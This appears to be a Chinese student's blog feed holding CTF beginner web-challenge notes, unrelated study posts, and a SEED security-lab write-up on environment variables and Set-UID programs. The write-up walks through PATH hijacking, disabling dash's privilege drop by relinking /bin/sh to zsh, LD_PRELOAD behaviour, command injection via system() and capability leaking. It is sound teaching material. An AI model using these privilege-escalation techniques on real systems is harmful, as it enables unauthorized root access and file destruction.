<li><p>cookie，就是burp抓包重放，查看response回应的cookie。<br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808185255022.png" alt="image-20210808185255022"><br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808185210329.png" alt="image-20210808185210329"></p>
</li>
<li><p>disabled_button，一个前段的绕过，很简单直接把属性disabled去掉即可。</p>
<p><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808185828168.png" alt="image-20210808185828168"></p>
</li>
<li><p>weak auth，这是我从来没有做过的，弱密码爆破，在burp抓包然后发到intruder模块爆破，选择爆破位置和模式，加载字典，开始爆破。<br><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808200134326.png" alt="image-20210808200134326"></p>
</li>
</ol>
<p><img src="/2021/08/08/CTF%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA/image-20210808200302716.png" alt="image-20210808200302716"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>今天就到这里吧，总之还是非常好的，而且有很多明星战队和赛事，<del>xman选拔赛我感觉是我现在的目标。</del></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DVWA靶场</title>
    <url>/2021/10/24/DVWA%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="DVWA靶场"><a href="#DVWA靶场" class="headerlink" title="DVWA靶场"></a>DVWA靶场</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶场通过phpstudy搭建。</p>
<p>DVWA 是一个入门的 Web 安全学习靶场，说简单也不简单，结合源码去学习的话，不仅可以入门安全也还可以学到不少安全加固的知识</p>
<h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>EnglishSix</title>
    <url>/2021/09/22/EnglishSix/</url>
    <content><![CDATA[<h1 id="EnglishSix"><a href="#EnglishSix" class="headerlink" title="EnglishSix"></a>EnglishSix</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>六级在即，学英语</p>
<h2 id="Words"><a href="#Words" class="headerlink" title="Words"></a>Words</h2><p>背单词时间表（获得网址：<a href="https://17gre.github.io/17GRE/">https://17gre.github.io/17GRE/</a> ）</p>
<p><img src="/2021/09/22/EnglishSix/image-20210926125114701.png" alt="image-20210926125114701"></p>
<p>早上学新单词，晚上复习旧单词。</p>
<h2 id="Reading-Comprehension"><a href="#Reading-Comprehension" class="headerlink" title="Reading Comprehension"></a>Reading Comprehension</h2><p>阅读理解参考书：《杨鹏长难句文字》</p>
<p><img src="/2021/09/22/EnglishSix/image-20210923144826224.png" alt="image-20210923144826224"></p>
<p>四种训练方式：</p>
<ol>
<li>意群训练。</li>
<li>不回视训练。</li>
<li>合理化原则推理训练。</li>
<li>速度与理解力的平衡点训练。</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>FIFO+HM62256电路+双FIFO缓冲</title>
    <url>/2021/05/11/FIFO+HM62256%E7%94%B5%E8%B7%AF+%E5%8F%8CFIFO%E7%BC%93%E5%86%B2/</url>
    <content><![CDATA[<p><img src="/2021/05/11/FIFO+HM62256%E7%94%B5%E8%B7%AF+%E5%8F%8CFIFO%E7%BC%93%E5%86%B2/0001.jpg" alt="0001"></p>
<p><img src="/2021/05/11/FIFO+HM62256%E7%94%B5%E8%B7%AF+%E5%8F%8CFIFO%E7%BC%93%E5%86%B2/0002.jpg" alt="0002"></p>
<p><img src="/2021/05/11/FIFO+HM62256%E7%94%B5%E8%B7%AF+%E5%8F%8CFIFO%E7%BC%93%E5%86%B2/0003.jpg" alt="0003"></p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>SEED 2.0 Softwarelab1:Environment Variable and SetUID</title>
    <url>/2021/10/21/SEED_lab1/</url>
    <content><![CDATA[<h1 id="Environment-Variable-and-SetUID"><a href="#Environment-Variable-and-SetUID" class="headerlink" title="Environment Variable and SetUID"></a>Environment Variable and SetUID</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>在本实验室中，学生将了解环境变量如何工作，如何从父进程传递到子进程，以及它们如何影响系统/程序行为。</p>
<p>我们特别感兴趣的是环境变量如何影响Set-UID程序（通常是特权程序）的行为。</p>
<p>本实验室涵盖以下主题：</p>
<ul>
<li>Environment variables，环境变量</li>
<li>Set-UID programs，Set-UID程序</li>
<li>Securely invoke external programs，安全地调用外部程序</li>
<li>Capability leaking，权限泄漏</li>
<li>Dynamic loader/linker，动态加载器/链接器</li>
</ul>
<h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Taks-1：Manipulating-Environment-Variables，操纵环境变量"><a href="#Taks-1：Manipulating-Environment-Variables，操纵环境变量" class="headerlink" title="Taks 1：Manipulating Environment Variables，操纵环境变量"></a>Taks 1：Manipulating Environment Variables，操纵环境变量</h3><p>在这个任务中，我们研究被用来创建和删除环境变量的命令。</p>
<p>请做以下的任务：</p>
<ul>
<li>使用<code>printenv</code>或者<code>env</code>命令去打印出环境变量。</li>
<li>使用<code>export</code>和<code>unset</code>命令去创建或者删除环境变量。这两个命令不是程序，是bash自带的内部命令。</li>
</ul>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ol>
<li>先用<code>env</code>命令查看环境变量<br><img src="/2021/10/21/SEED_lab1/image-20211020232822008.png" alt="image-20211020232822008"></li>
<li>然后<code>export sung_lab=test</code>创建一个环境变量，用<code>env | grep sung_lab</code>或者<code>printenv sung_lab</code>命令查看</li>
<li>最后<code>unset sung_lab</code>删除环境变量<code>sung_lab</code>，同样查看一下<br><img src="/2021/10/21/SEED_lab1/image-20211020233319753.png" alt="image-20211020233319753"></li>
</ol>
<h3 id="Task-2：Passing-Environment-Variables-from-Parent-Process-to-Child-Process，传递父进程的环境变量给子进程"><a href="#Task-2：Passing-Environment-Variables-from-Parent-Process-to-Child-Process，传递父进程的环境变量给子进程" class="headerlink" title="Task 2：Passing Environment Variables from Parent Process to Child Process，传递父进程的环境变量给子进程"></a>Task 2：Passing Environment Variables from Parent Process to Child Process，传递父进程的环境变量给子进程</h3><p>在这个任务中，我们研究一个子进程如何从它的父进程得到环境变量。</p>
<p>我们想知道是否父进程的环境变量会被子进程继承。</p>
<h4 id="Step-1-请运行myprintenv-c程序，并描述你看到的现象。"><a href="#Step-1-请运行myprintenv-c程序，并描述你看到的现象。" class="headerlink" title="Step 1. 请运行myprintenv.c程序，并描述你看到的现象。"></a>Step 1. 请运行myprintenv.c程序，并描述你看到的现象。</h4><ol>
<li><p>使用<code>gcc myprintenv.c</code>命令编译它，生成<code>a.out</code>二进制程序。</p>
</li>
<li><p>使用<code>a.out &gt; file</code>运行这个二进制程序并将结果保存到<code>file</code>文件。</p>
<p><img src="/2021/10/21/SEED_lab1/image-20211021082901997.png" alt="image-20211021082901997"><br><img src="/2021/10/21/SEED_lab1/image-20211021084800668.png" alt="image-20211021084800668"><br><img src="/2021/10/21/SEED_lab1/image-20211021084917107.png" alt="image-20211021084917107"><br><img src="/2021/10/21/SEED_lab1/image-20211021085010998.png" alt="image-20211021085010998"></p>
</li>
<li><p>现象：我们看到<code>a.out</code>像<code>env</code>命令一样输出了环境变量，我们查看源码知道，这里输出的是<code>fork()</code>创建出的子进程的环境变量。</p>
</li>
</ol>
<h4 id="Step-2-注释子进程的printenv-函数，取消注释父进程的printenv-函数并重新编译运行保存结果。"><a href="#Step-2-注释子进程的printenv-函数，取消注释父进程的printenv-函数并重新编译运行保存结果。" class="headerlink" title="Step 2. 注释子进程的printenv()函数，取消注释父进程的printenv()函数并重新编译运行保存结果。"></a>Step 2. 注释子进程的printenv()函数，取消注释父进程的printenv()函数并重新编译运行保存结果。</h4><ol>
<li>修改文件<br><img src="/2021/10/21/SEED_lab1/image-20211021084533013.png" alt="image-20211021084533013"></li>
<li>重新编译运行，保存结果到<code>file2</code><br><img src="/2021/10/21/SEED_lab1/image-20211021085304578.png" alt="image-20211021085304578"><br><img src="/2021/10/21/SEED_lab1/image-20211021085335272.png" alt="image-20211021085335272"><br><img src="/2021/10/21/SEED_lab1/image-20211021085425404.png" alt="image-20211021085425404"><br><img src="/2021/10/21/SEED_lab1/image-20211021085456050.png" alt="image-20211021085456050"></li>
<li>现象：我们看到<code>a.out</code>输出了环境变量，我们之前修改源码，<code>switch</code>中将子进程的<code>printenv()</code>注释的同时将父进程的<code>printenv()</code>取消注释，所以这里输出的是父进程的环境变量。</li>
</ol>
<h4 id="Step-3-使用diff命令比较两个文件内容的不同。得出你的结论。"><a href="#Step-3-使用diff命令比较两个文件内容的不同。得出你的结论。" class="headerlink" title="Step 3. 使用diff命令比较两个文件内容的不同。得出你的结论。"></a>Step 3. 使用diff命令比较两个文件内容的不同。得出你的结论。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021090547419.png" alt="image-20211021090547419"></p>
<p>结论：我们看到父进程和子进程打印的环境变量没有不同，所以得出结论，子进程会完整地继承父进程的环境变量。</p>
<h3 id="Task-3：Environment-Variables-and-execve-，环境变量和execve-函数"><a href="#Task-3：Environment-Variables-and-execve-，环境变量和execve-函数" class="headerlink" title="Task 3：Environment Variables and execve()，环境变量和execve()函数"></a>Task 3：Environment Variables and execve()，环境变量和execve()函数</h3><p>在这个任务中，我们研究当一个新程序被通过<code>execve()</code>函数执行的时候，环境变量是如何被影响的。</p>
<p>基本上，<code>execve()</code>函数在调用进程中运行新程序。</p>
<p>我们对环境变量发生了什么感兴趣，他们是否会被新程序自动继承？    </p>
<h4 id="Step-1-编译并运行myenv-c程序，描述你看到的现象。"><a href="#Step-1-编译并运行myenv-c程序，描述你看到的现象。" class="headerlink" title="Step 1. 编译并运行myenv.c程序，描述你看到的现象。"></a>Step 1. 编译并运行myenv.c程序，描述你看到的现象。</h4><p>程序简单地执行了<code>/usr/bin/env</code>程序，这个程序会打印当前进程的环境变量。</p>
<p><img src="/2021/10/21/SEED_lab1/image-20211021092417939.png" alt="image-20211021092417939"></p>
<p>很奇怪，没有环境变量输出。</p>
<h4 id="Step-2-修改execve-函数调用的参数，描述你看到的现象。"><a href="#Step-2-修改execve-函数调用的参数，描述你看到的现象。" class="headerlink" title="Step 2. 修改execve()函数调用的参数，描述你看到的现象。"></a>Step 2. 修改execve()函数调用的参数，描述你看到的现象。</h4><ol>
<li>修改第三个参数<code>NULL</code>为<code>environ</code>，如图所示：<br><img src="/2021/10/21/SEED_lab1/image-20211021093119656.png" alt="image-20211021093119656"></li>
<li>重新编译运行，查看结果<br><img src="/2021/10/21/SEED_lab1/image-20211021093436697.png" alt="image-20211021093436697"><br><img src="/2021/10/21/SEED_lab1/image-20211021093519126.png" alt="image-20211021093519126"></li>
<li>我们可以看到，这次正确输出了环境变量</li>
</ol>
<h4 id="Step-3-关于新程序如何得到它的环境变量，请给出你的结论"><a href="#Step-3-关于新程序如何得到它的环境变量，请给出你的结论" class="headerlink" title="Step 3. 关于新程序如何得到它的环境变量，请给出你的结论"></a>Step 3. 关于新程序如何得到它的环境变量，请给出你的结论</h4><p>通过<code>execve()</code>等函数运行新程序，可以在参数里指定环境变量指针来对新程序设置环境变量。</p>
<p>这也正是step 1和 step 2结果有差异的原因</p>
<p>step 1设置新程序环境变量指针为空，所以新程序没有得到环境变量，也就没有输出; </p>
<p>step 2中设置了环境变量，所以新程序得到环境变量，所以有输出。</p>
<h3 id="Task-4：Environment-Variables-and-system-，环境变量和system-函数"><a href="#Task-4：Environment-Variables-and-system-，环境变量和system-函数" class="headerlink" title="Task 4：Environment Variables and system()，环境变量和system()函数"></a>Task 4：Environment Variables and system()，环境变量和system()函数</h3><p>在这个任务中，我们研究当一个新程序被通过<code>system()</code>函数执行的时候，环境变量如何被影响。</p>
<p><code>system()</code>实际上执行<code>/bin/sh</code>，并请求shell去执行命令。</p>
<p><code>system()</code>先使用<code>execl()</code>函数去执行<code>/bin/sh</code>，<code>execl()</code>调用<code>execve()</code>，传递给它环境变量数组。</p>
<p>因此，使用<code>system()</code>函数，调用进程的环境变量被传递给新程序<code>/bin/sh</code></p>
<p>请编译并运行如下程序去验证这个结论。</p>
<h4 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a>过程</h4><ol>
<li>编辑一个<code>verify.c</code>程序，文件内容如下：<br><img src="/2021/10/21/SEED_lab1/image-20211021101703340.png" alt="image-20211021101703340"></li>
<li>编译并运行，查看结果<br><img src="/2021/10/21/SEED_lab1/image-20211021101929315.png" alt="image-20211021101929315"><br><img src="/2021/10/21/SEED_lab1/image-20211021102001671.png" alt="image-20211021102001671"></li>
<li>可以看到输出了环境变量。说明环境变量从调用进程传给了<code>/bin/sh</code>，再从<code>/bin/sh</code>传给了子进程<code>env</code>。</li>
</ol>
<h3 id="Task-5：Environment-Variable-and-Set-UID-Programs，环境变量和Set-UID程序"><a href="#Task-5：Environment-Variable-and-Set-UID-Programs，环境变量和Set-UID程序" class="headerlink" title="Task 5：Environment Variable and Set-UID Programs，环境变量和Set-UID程序"></a>Task 5：Environment Variable and Set-UID Programs，环境变量和Set-UID程序</h3><p>Set-UID是Unix操作系统一种重要的安全机制。当一个Set-UID程序运行时，它假使程序所属用户的权限。</p>
<p>例如，如果一个程序的所属用户是root，那么当任何人去运行它，在调用过程中这个程序都会获得root权限。</p>
<p>Set-UID允许我们去做很多有趣的事情，但由于它升级了当前用户的特权，它是相当危险的。</p>
<p>尽管Set-UID程序的行为被程序逻辑所决定，而不是用户，但是用户确实能通过改变环境变量去影响它的行为。</p>
<p>为了理解Set-UID如何被影响，让我们搞清楚Set-UID程序的进程是否会继承当前用户进程的环境变量。</p>
<h4 id="Step-1-编写以下程序，它能打印出当前进程的环境变量。"><a href="#Step-1-编写以下程序，它能打印出当前进程的环境变量。" class="headerlink" title="Step 1. 编写以下程序，它能打印出当前进程的环境变量。"></a>Step 1. 编写以下程序，它能打印出当前进程的环境变量。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021105132343.png" alt="image-20211021105132343"></p>
<h4 id="Step-2-编译以上程序，改变所属用户，并使它成为一个Set-UID程序。"><a href="#Step-2-编译以上程序，改变所属用户，并使它成为一个Set-UID程序。" class="headerlink" title="Step 2. 编译以上程序，改变所属用户，并使它成为一个Set-UID程序。"></a>Step 2. 编译以上程序，改变所属用户，并使它成为一个Set-UID程序。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021105539178.png" alt="image-20211021105539178"></p>
<h4 id="Step-3-你需要用非root用户去设置以下环境变量（它可能已经存在）"><a href="#Step-3-你需要用非root用户去设置以下环境变量（它可能已经存在）" class="headerlink" title="Step 3. 你需要用非root用户去设置以下环境变量（它可能已经存在）"></a>Step 3. 你需要用非root用户去设置以下环境变量（它可能已经存在）</h4><ul>
<li>PATH</li>
<li>LD_LIBRARY_PATH</li>
<li>ANY_NAME （这是由你定义的环境变量，因此选择你想要的名字）</li>
</ul>
<p>这些环境变量设置在当前用户的shell进程。</p>
<p>现在，运行Step 2创建的Set-UID程序。请检查你在shell进程（父进程）所设置的所有的环境变量是否都进入了Set-UID子进程。</p>
<p>描述你的观察。如果遇到令人惊讶的现象，描述他们。</p>
<ol>
<li>查看这三个环境变量的值，发现只有PATH存在。<br><img src="/2021/10/21/SEED_lab1/image-20211021111121776.png" alt="image-20211021111121776"></li>
<li>设置这两个不存在的环境变量和已经存在的变量PATH<br><img src="/2021/10/21/SEED_lab1/image-20211021111652449.png" alt="image-20211021111652449"></li>
<li>我们运行Step 2生成的<code>foo</code>程序，查看我们设置的三个环境变量<br><img src="/2021/10/21/SEED_lab1/image-20211021112224792.png" alt="image-20211021112224792"></li>
<li>我们发现<code>LD_LIBRARY_PATH</code>并没有进入Set-UID子进程，进一步查看差异<br><img src="/2021/10/21/SEED_lab1/image-20211021112921464.png" alt="image-20211021112921464"></li>
<li>我们发现除了LD_LIBRARY_PATH环境变量外，只有<code>_</code>变量不同。</li>
</ol>
<p>可以看到输出的环境变量中包含PATH 和 ANY_NAME，且环境变量PATH为我们修改后的值。但其中没有我们用 export 命令设置的环境变量LD_LIBRARY_PATH。这个出乎意外，按道理说用 export 设置的都会进入子程序的环境变量。</p>
<p>其实这是一种动态链接器的保护策略，因为这个程序用到了动态链接库。</p>
<p>因为我们是在普通用户的状态下修改 LD_LIBRARY_PATH，如果这个修改能传递到 set-uid 程序中，那么我们就能通过修改 LD_LIBRARY_PATH 来改变 set-uid程序的库的寻找位置来实施攻击。</p>
<p>因此动态链接器在 effective uid 和 real uid不一致 或者 effective groupid 和 real groupid不一致时，会将 LD_LIBRARY_PATH 和 LD_PRELOAD 环境变量忽略掉，所以子进程是看不到的。</p>
<p>而其他的环境变量动态链接器没有使用到，因此也不会去干涉，所以子进程能够得到。</p>
<h3 id="Task-6：The-PATH-Environment-Variable-and-Set-UID-Programs，PATH环境变量和Set-UID程序"><a href="#Task-6：The-PATH-Environment-Variable-and-Set-UID-Programs，PATH环境变量和Set-UID程序" class="headerlink" title="Task 6：The PATH Environment Variable and Set-UID Programs，PATH环境变量和Set-UID程序"></a>Task 6：The PATH Environment Variable and Set-UID Programs，PATH环境变量和Set-UID程序</h3><p>因为shell程序被调用，在Set-UID程序里调用<code>system()</code>函数是相当危险的。</p>
<p>这是因为shell程序的真实行为会被环境变量影响，像是$PATH变量，这些环境变量是由用户提供的，而用户可能是恶意的。</p>
<p>通过改变这些环境变量，恶意用户可以控制Set-UID程序的行为。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请编译以上程序，改变程序所属用户为root，并且让它成为一个Set-UID程序。</p>
<p>使用Set-UID程序去执行你的恶意代码，描述并解释你观察的现象。</p>
<h4 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a>过程</h4><ol>
<li><p>先准备一个Set-UID程序，我们现在得到一个Set-UID程序<code>myls</code><br><img src="/2021/10/21/SEED_lab1/image-20211021144813929.png" alt="image-20211021144813929"></p>
</li>
<li><p>修改环境变量PATH，增加/home/seed/Desktop/Labsetup目录，我们将在这个目录下面存放恶意程序<br><img src="/2021/10/21/SEED_lab1/image-20211021152009796.png" alt="image-20211021152009796"></p>
</li>
<li><p>以id命令为例，将id文件更名为ls放在/home/seed/Desktop/Labsetup目录下面，当我们执行myls文件，不再调用ls而是名为ls的id命令。<br><img src="/2021/10/21/SEED_lab1/image-20211021152108820.png" alt="image-20211021152108820"></p>
</li>
</ol>
<p>程序 id 是Set-UID程序运行的，按理说应该也有 root 权限，但从程序 id 的输出来看，其并没有获得 root 权限。</p>
<p>这是因为Ubuntu 20.04 VM，/bin/bash实际上是指向/bin/dash的符号链接。 </p>
<p>/bin/dash 中有一个对策，当它发现自己自己在一个Set-UID程序中执行时，它会把有效用户ID（root）改成当前进程的真实用户ID（seed）, 也就是放弃了特权，所以攻击失败。</p>
<p>SEED_Ubuntu有一个叫做zsh的shell程序，我们可以使用一下命令链接/bin/sh到/bin/zsh：</p>
<p><code>sudo ln -sf /bin/zsh /bin/sh</code></p>
<p>再次执行，结果如下所示： </p>
<p><img src="/2021/10/21/SEED_lab1/image-20211021153534901.png" alt="image-20211021153534901"></p>
<h3 id="Task-7：The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs，LD-PRELOAD环境变量和Set-UID程序"><a href="#Task-7：The-LD-PRELOAD-Environment-Variable-and-Set-UID-Programs，LD-PRELOAD环境变量和Set-UID程序" class="headerlink" title="Task 7：The LD_PRELOAD Environment Variable and Set-UID Programs，LD_PRELOAD环境变量和Set-UID程序"></a>Task 7：The LD_PRELOAD Environment Variable and Set-UID Programs，LD_PRELOAD环境变量和Set-UID程序</h3><p>在本任务中，我们研究Set-UID程序如何处理一些环境变量。</p>
<p>一些环境变量，包括LD_PRELOAD、LD_LIBRARY_PATH和其他会影响动态加载器/连接器行为的LD_*环境变量。</p>
<p>动态加载器/链接器是操作系统（OS）的一部分，它在运行时加载（从持久存储到RAM）和链接可执行文件所需的共享库。</p>
<p>在Linux中，ld.so或ld-Linux.so是动态加载器/链接器（每个都用于不同类型的二进制文件）。在影响其行为的环境变量中，我们在本次试验中关注LD_LIBRARY_PATH和LD_PRELOAD。</p>
<p>在Linux中，LD_LIBRARY_PATH是一组以冒号分隔的目录，在其中首先搜索库，然后搜索标准目录集。</p>
<p>LD_PRELOAD指定要在所有其他库之前加载的其他用户指定共享库的列表。</p>
<p>在本任务中，我们将只研究LD_PRELOAD。</p>
<h4 id="Step-1-首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器-链接器。"><a href="#Step-1-首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器-链接器。" class="headerlink" title="Step 1. 首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器/链接器。"></a>Step 1. 首先，我们要理解当运行一个普通程序时，环境变量是如何影响这些动态加载器/链接器。</h4><ol>
<li>我们先建立一个动态链接库，创建<code>mylib.c</code>，它覆盖了libc的<code>sleep()</code>函数<br><img src="/2021/10/21/SEED_lab1/image-20211021155829901.png" alt="image-20211021155829901"></li>
<li>我们可以使用以下命令编译上述程序<br><img src="/2021/10/21/SEED_lab1/image-20211021161341297.png" alt="image-20211021161341297"></li>
<li>现在，设置LD_PRELOAD环境变量：<br><img src="/2021/10/21/SEED_lab1/image-20211021161442505.png" alt="image-20211021161442505"></li>
<li>最后，编译下面的程序myprog，并在与上面动态链接库libmylib.so.1.0.1相同的目录下<br><img src="/2021/10/21/SEED_lab1/image-20211021161714670.png" alt="image-20211021161714670"></li>
</ol>
<h4 id="Step-2-完成上述操作后，请在以下条件下运行myprog，并观察发生的情况"><a href="#Step-2-完成上述操作后，请在以下条件下运行myprog，并观察发生的情况" class="headerlink" title="Step 2. 完成上述操作后，请在以下条件下运行myprog，并观察发生的情况"></a>Step 2. 完成上述操作后，请在以下条件下运行myprog，并观察发生的情况</h4><ul>
<li>使myprog成为一个普通程序，运行它作为一个普通用户<br><img src="/2021/10/21/SEED_lab1/image-20211021162603277.png" alt="image-20211021162603277"><br>现象：执行我们覆盖的sleep()函数，输出 i am not sleeping!</li>
<li>使myprog成为一个Set-UID root程序，运行它作为一个普通用户<br><img src="/2021/10/21/SEED_lab1/image-20211021163126750.png" alt="image-20211021163126750"><br>现象：等待一秒后结束，无输出</li>
<li>使myprog成为一个Set-UID root程序，作为root用户再一次改变LD_PRELOAD环境变量的值，运行它。<br><img src="/2021/10/21/SEED_lab1/image-20211021163339271.png" alt="image-20211021163339271"><br>现象：执行我们覆盖的sleep()函数，输出 i am not sleeping!</li>
<li>使myprog成为一个Set_UID user1程序，在另一个用户帐户（非root用户）中再次改变LD_PRELOAD环境变量并运行它<br><img src="/2021/10/21/SEED_lab1/image-20211021163940025.png" alt="image-20211021163940025"><br>现象：等待一秒后结束，无输出</li>
</ul>
<h4 id="Step-3-分析上述结果不同的原因"><a href="#Step-3-分析上述结果不同的原因" class="headerlink" title="Step 3. 分析上述结果不同的原因"></a>Step 3. 分析上述结果不同的原因</h4><p>造成不同结果的关键在于 LD_PRELOAD 环境变量有没有被动态连接器屏蔽，LD_PRELOAD 和 LD_LIBRARY_PATH 类似，具体机制可以查看上面 Task 5 及其分析。</p>
<p>对于第一种情况，euid等于uid，均为seed，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p>
<p>对于第二种情况，euid为root，uid为seed，不相同，LD_PRELOAD 环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p>
<p>对于第三种情况，euid 等于uid，均为 root，LD_PRELOAD 环境变量没有被屏蔽，所以链接的是 libmylib.so.1.0.1，输出一句话</p>
<p>对于第四种情况，euid为uer1，uid为seed，不相同，LD_PRELOAD 环境变量被屏蔽，从标准路径查找链接库，所以链接的是标准库。所以结果为等待一秒后结束，无输出。</p>
<h3 id="Task-8：Invoking-External-Programs-Using-system-versus-execve-，使用system-和execve-函数调用外部程序"><a href="#Task-8：Invoking-External-Programs-Using-system-versus-execve-，使用system-和execve-函数调用外部程序" class="headerlink" title="Task 8：Invoking External Programs Using system() versus execve()，使用system()和execve()函数调用外部程序"></a>Task 8：Invoking External Programs Using system() versus execve()，使用system()和execve()函数调用外部程序</h3><p>尽管<code>system()</code>和<code>execve()</code>函数都被用来去运行一个新程序，但是因为环境变量可以影响shell的工作，所以<code>system()</code>函数要危险得多，例如Set-UID程序中使用。<code>execve()</code>没有这个问题，因为它不调用shell。</p>
<p>调用shell还有另一个危险的后果，这次与环境变量无关。</p>
<h4 id="Step-1-编译catall程序并让它成为一个Set-root-UID程序，程序将使用system-函数调用命令。"><a href="#Step-1-编译catall程序并让它成为一个Set-root-UID程序，程序将使用system-函数调用命令。" class="headerlink" title="Step 1. 编译catall程序并让它成为一个Set-root-UID程序，程序将使用system()函数调用命令。"></a>Step 1. 编译catall程序并让它成为一个Set-root-UID程序，程序将使用system()函数调用命令。</h4><p>如果你是Bob，你能否删除一个不可写的文件？</p>
<ol>
<li><p>编译程序，并设置为Set-root-UID程序<br><img src="/2021/10/21/SEED_lab1/image-20211021170716399.png" alt="image-20211021170716399"></p>
</li>
<li><p>实施一个删除文件攻击, 用 root 账户在 /root 目录下新建一个文件example， 然后切换到 seed 账户，可以看到无法访问也无法删除该文件。<br><img src="/2021/10/21/SEED_lab1/image-20211021171009166.png" alt="image-20211021171009166"></p>
</li>
<li><p>在第一条命令执行后，继续执行恶意命令，成功删除example文件<br><img src="/2021/10/21/SEED_lab1/image-20211021171522720.png" alt="image-20211021171522720"><br><img src="/2021/10/21/SEED_lab1/image-20211021171442550.png" alt="image-20211021171442550"></p>
</li>
</ol>
<h4 id="Step-2-将step-1中的调用system函数改成调用execve，重复上面的流程。"><a href="#Step-2-将step-1中的调用system函数改成调用execve，重复上面的流程。" class="headerlink" title="Step 2. 将step 1中的调用system函数改成调用execve，重复上面的流程。"></a>Step 2. 将step 1中的调用system函数改成调用execve，重复上面的流程。</h4><p><img src="/2021/10/21/SEED_lab1/image-20211021171828008.png" alt="image-20211021171828008"></p>
<p><img src="/2021/10/21/SEED_lab1/image-20211021172024896.png" alt="image-20211021172024896"></p>
<p>可以发现，运行报错并且未删除该文件</p>
<p>分析：在使用system函数时，最终是shell去执行命令，而且未仔细检查用户输入，使得其执行了两条命令。其中第二条命令为恶意构造的命令，删除了文件。改成使用execve之后，这种攻击方式是不会成功的，因为它是通过系统调用的方式去执行，只能执行一个进程，且进程名已指定，不会产生这种漏洞。</p>
<h3 id="Task-9：Capability-Leaking，权限泄漏"><a href="#Task-9：Capability-Leaking，权限泄漏" class="headerlink" title="Task 9：Capability Leaking，权限泄漏"></a>Task 9：Capability Leaking，权限泄漏</h3><p><img src="/2021/10/21/SEED_lab1/image-20211021172835747.png" alt="image-20211021172835747"></p>
<p>先用 root 权限创建 /etc/zzz 文件。然后编译上面代码，并设置为Set-root-UID程序。</p>
<p>使用普通账户运行该程序发现等了一秒，无输出。查看 /etc/zzz 可以发现文件内容已经被修改。</p>
<p><img src="/2021/10/21/SEED_lab1/image-20211021201721022.png" alt="image-20211021201721022"><br><img src="/2021/10/21/SEED_lab1/image-20211021201807244.png" alt="image-20211021201807244"></p>
<p><strong>原因分析：</strong>这个特权程序打开了一个重要的的系统文件，并且在放弃特权时没有关闭该文件，而后调用Fork，子进程会继承这个文件描述符，造成特权泄露。子进程可以通过泄露的文件描述符向文件写入恶意内容</p>
]]></content>
      <categories>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
        <tag>Lab</tag>
      </tags>
  </entry>
  <entry>
    <title>SEED 2.0 Softwarelab2:Shellshock Attack Lab</title>
    <url>/2021/10/28/SEED_lab2/</url>
    <content><![CDATA[<h1 id="Shellshock-Attack-Lab"><a href="#Shellshock-Attack-Lab" class="headerlink" title="Shellshock Attack Lab"></a>Shellshock Attack Lab</h1><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>shellshock漏洞可以利用很多系统，它可以被远程或者本地一个机器启动。</p>
<p>本实验包含以下几个主题：</p>
<ul>
<li>Shellshock</li>
<li>环境变量</li>
<li>在bash中函数的定义</li>
<li>Apache和CGI程序</li>
</ul>
<h2 id="Environment-Setup"><a href="#Environment-Setup" class="headerlink" title="Environment Setup"></a>Environment Setup</h2><h3 id="DNS-setting"><a href="#DNS-setting" class="headerlink" title="DNS setting"></a>DNS setting</h3><p><img src="/2021/10/28/SEED_lab2/image-20211027172835071.png" alt="image-20211027172835071"></p>
<h3 id="Container-Setup-and-Commands"><a href="#Container-Setup-and-Commands" class="headerlink" title="Container Setup and Commands"></a>Container Setup and Commands</h3><p>运行一个docker容器：</p>
<ol>
